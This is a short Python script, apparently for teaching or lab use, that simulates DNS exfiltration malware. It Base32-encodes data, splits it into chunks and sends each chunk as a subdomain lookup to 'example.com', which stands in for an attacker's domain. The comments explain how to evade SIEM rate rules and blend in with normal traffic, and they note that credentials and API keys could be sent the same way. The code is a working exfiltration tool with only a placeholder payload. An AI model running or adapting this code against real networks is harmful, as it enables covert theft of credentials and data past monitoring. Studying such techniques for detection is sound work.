"""
Important: this is not a malware, everything done is contained within a safe and controlled environment.

This file simulates a malware that:
Takes sensitive data
Encodes it using Base32
Exfiltrates it through DNS queries

This is a commonly used method by attackers because:
DNS traffic is rarely inspected in depth
Port 53 is almost always allowed
Works even in locked down networks
"""

import base64               # use base32 to ensure all characters are DNS valid
import dns.resolver         # uses dnspython instead of raw sockets
import time                 # add delays to avoid rate based SIEM rules

domain = "example.com"      # domain controlled by attacker
chunk_size = 30             # safe DNS label size (max size is 63 chars)

# this function prepares data passed into it for DNS transport by encoding it in base32
def encode_data(data):
    encoded = base64.b32encode(data.encode()).decode().strip("=")

    # divide the resulting encoded data into chunks of 30, and return them back
    return [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

# this function exfiltrates the encoded message through DNS queries to the attackers domain
def send_dns_queries(chunks):

    # use system DNS resolver due to high corporate trusted infrastructure
    resolver = dns.resolver.Resolver()

    # the data to be filtrated is broken down into chunks, send one chunk at a time
    for chunk in chunks:

        # subdomain construction using each chunk
        subdomain = f"{chunk}.{domain}"

        # send 'A' record lookup (most common DNS query, blends in with normal traffic)
        try:
            resolver.resolve(subdomain, "A")
            print(f"[+] Sent: {subdomain}")
        except:
            pass

        # attempt to mimic human traffic by setting artifical delay
        time.sleep(0.5)

if __name__ == "__main__":
    # sensitive data like API keys, credentials and files can be sent over using this
    data = "This_data_is_sensitive. Exfiltrate_this_data_over_DNS."
    chunks = encode_data(data)
    send_dns_queries(chunks)
